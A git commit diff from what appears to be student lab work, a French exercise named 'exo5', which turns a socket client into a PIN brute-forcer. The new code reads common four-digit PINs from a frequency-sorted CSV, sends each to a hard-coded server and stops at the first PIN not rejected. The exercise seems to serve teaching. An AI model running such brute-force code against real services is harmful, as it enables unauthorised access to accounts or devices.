b2809ad0433e73aea221f17f11f86a9b22ab647a
SamuelPouyade <samuel.pouyade@outlook.fr>
2024-09-23 12:52:04 +0200

    POC exo5 fonctionnel

--- TP1/exo5.py
+++ TP1/exo5.py
@@ -1,4 +1,4 @@
-import os, sys, socket
+import os, sys, socket, csv
 
 server = "51.195.253.124"
 port = 12345
@@ -6,14 +6,20 @@ port = 12345
 ma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-	ma_socket.connect((server, port))
+    ma_socket.connect((server, port))
 except Exception as e:
-	print("Problème de connexion", e.args)
-	sys.exit(1)
+    print("Problème de connexion", e.args)
+    sys.exit(1)
 
 ligne = ma_socket.recv(1024)
 print(ligne)
 
-ma_socket.sendall(b"0000\n")
-ligne = ma_socket.recv(1024)
-print(ligne)
+with open('four-digit-pin-codes-sorted-by-frequency-withcount.csv', newline='') as csvfile:
+    spamreader = csv.reader(csvfile, delimiter=',')
+    for pin, _ in spamreader:
+        ma_socket.sendall(bytes(pin, 'utf-8'))
+        ligne = str(ma_socket.recv(1024))
+        if not ligne.startswith('b\'Incorrect PIN'):
+            print(f"PIN FOUND : {pin}")
+            print(ligne)
+            break
